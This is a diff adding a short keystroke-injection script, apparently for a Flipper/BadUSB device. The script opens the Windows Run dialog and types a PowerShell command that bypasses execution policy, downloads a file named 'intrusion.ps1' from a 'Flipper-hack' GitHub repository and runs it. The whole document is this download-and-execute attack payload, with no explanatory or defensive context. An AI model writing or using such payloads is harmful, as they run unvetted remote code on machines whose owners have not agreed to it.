@@ -1,0 +1,5 @@
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Maximized -NoExit -ExecutionPolicy Bypass -Command "& {$h='$env:USERPROFILE\intrusion.ps1'; iwr -UseBasicParsing 'https://raw.githubusercontent.com/zrcomSinister/Flipper-hack/main/intrusion.ps1' -OutFile $h; & $h}"
+ENTER
